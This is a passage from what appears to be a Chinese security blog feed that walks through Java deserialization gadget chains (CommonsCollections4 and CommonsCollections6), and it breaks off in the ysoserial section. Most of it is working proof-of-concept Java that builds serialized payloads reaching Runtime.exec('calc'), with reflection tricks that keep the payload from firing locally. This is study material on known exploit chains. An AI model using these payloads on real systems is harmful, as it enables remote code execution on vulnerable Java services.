class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>运行完会发现其实是在本地执行了，并且还出现了报错</p>
<p>原因是因为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>

<p>在这个add方法中，会调用如下的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add() -&gt; priorityQueue.offer() -&gt; priorityQueue.siftUp() -&gt; priorityQueue.siftUpUsingComparator()</span><br></pre></td></tr></table></figure></div>

<p>最后也会去调用到**siftUpUsingComparator()<strong>，然后也是调用</strong>compare()<strong>，再调用</strong>transform()**，然后走流程，所以会本地执行</p>
<p>可以这么解决</p>
<p>先传一个不会执行的代码，在**add()**完之后，再将不会执行的代码替换成会执行的代码</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span></span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">TransformingComparator</span>&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections4</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections6</title>
    <url>/2023/09/12/Java%E5%AE%89%E5%85%A8/CommonsCollection6%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul>
<li>利用版本</li>
</ul>
<p>CommonsCollections 3.1 - 3.2.1</p>
<ul>
<li>JDK</li>
</ul>
<p>暂无限制</p>
<h1 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h1><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Gadget chain:</span></span><br><span class="line"><span class="comment"> 	java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment"> 		java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment"> 			java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">				org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">				org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment"> 						org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">							org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">							org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> 							java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment"> 								java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，CC6链从<strong>LazyMap.get()<strong>的后半部分是跟</strong>CC1</strong>相同的，前面不再使用<strong>AnnotationInvocationHandler</strong>类的<strong>readObject()<strong>作为反序列化的入口类了，从而解决了在</strong>JDK 8u71</strong>版本之后无法使用CC1链的问题。</p>
<p><strong>CC6</strong>的前半部分与<strong>URLDNS</strong>链相似，都是利用<strong>HashMap</strong>类在计算<strong>hash</strong>值时调用<strong>hashCode()<strong>的方法，从而进入到</strong>getValue()<strong>，在之后到达</strong>LazyMap.get()</strong></p>
<h1 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h1><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>已经知道利用链了，所以可以知道在<strong>TiedMapEntry</strong>类中的**getValue()<strong>方法调用了</strong>get()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>往上找，发现<strong>map</strong>可以通过<strong>TiedMapEntry</strong>构造器赋值</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且可以看到**TiedMapEntry.hashCode()<strong>方法中调用了</strong>getValue()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>现在就是去找哪里可以调用**TiedMapEntry.hashCode()**方法</p>
<p>根据利用链可以知道在<strong>HashMap.readObject()<strong>中可以调用到</strong>TiedMapEntry.hashCode()</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>HashMap</strong>的<strong>readObject()<strong>中调用了</strong>hash(key)</strong></p>
<p>而在<strong>hash(key)<strong>中调用了</strong>key.hashCode()</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到当<strong>key</strong>不为空时会调用<strong>key.hashCode()</strong></p>
<p>所以我们只需让<strong>HashMap</strong>的<strong>key</strong>等于<strong>TiedMapEntry</strong>对象即可</p>
<p>而<strong>TiedMapEntry</strong>中<strong>map</strong>属性存放的是恶意的<strong>LazyMap</strong>对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">serialize(map2);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>执行后会发现在序列化之前就会弹出计算器</p>
<p>原因是因为<strong>map.put</strong>中也会调用<strong>hash(key)</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <strong>map2.put(tiedMapEntry, “bbb”)</strong> 将构造好的 TiedMapEntry 对象放进 HashMap的时候就要触发一次 **hash(key)**进而触发一次这一条链弹出计算器</p>
<p>所以我们可以在构造<strong>LazyMap</strong>时先放入一个不会执行命令的对象</p>
<p>然后再等最后要⽣成<strong>Payload</strong>的时候，再把真正的<strong>transformers</strong>替换进去</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的transformers数组设置进来</span></span><br><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">serialize(map2);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>也可以写成</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的transformers数组设置进来</span></span><br><span class="line">Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">chainedTransformerClassField</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">chainedTransformerClassField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">chainedTransformerClassField.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">serialize(map2);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="lazyMap-Remove"><a href="#lazyMap-Remove" class="headerlink" title="lazyMap.Remove"></a>lazyMap.Remove</h2><p>当执行上面的代码时，会发现还是不能执行成功</p>
<p>问题出现在在<strong>LazyMap</strong>的**get()**⽅法上</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123; <span class="comment">//key: &quot;aaa&quot;</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为<strong>map.containsKey(key)<strong>是true，所以并没有进入</strong>if</strong>循环，直接<strong>return</strong></p>
<p>但是会发现在<strong>lazyMap</strong>类中也没有放入<strong>key</strong>值为<strong>aaa</strong>的对象</p>
<p>唯一出现<strong>aaa</strong>是在<strong>tiedMapEntry</strong>对象上</p>
<p>关键点还是在**map2.put(tiedMapEntry, “bbb”)**上</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为<strong>put</strong>中会执行<strong>hash(key)</strong></p>
<p>所以<strong>LazyMap</strong>的利用链会在这里被调用一次</p>
<p>而前面使用了<strong>Map&lt;Object,Object&gt; lazyMap &#x3D; LazyMap.decorate(map, new ConstantTransformer(1))</strong></p>
<p>所以才没有执行对应的命令</p>
<p>debug的时候发现只需要将<strong>key</strong>的值删掉就会进入<strong>if</strong>里</p>
<p>所以我们只需将<strong>lazyMap</strong>的<strong>key</strong>删掉即可</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的transformers数组设置进来</span></span><br><span class="line">Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">chainedTransformerClassField</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">chainedTransformerClassField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">chainedTransformerClassField.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">serialize(map2);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-ysoserial中的CC6"><a href="#0x03-ysoserial中的CC6" class="headerlink" title="0x03 ysoserial中的CC6"></a>0x03 ysoserial中的CC6</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by 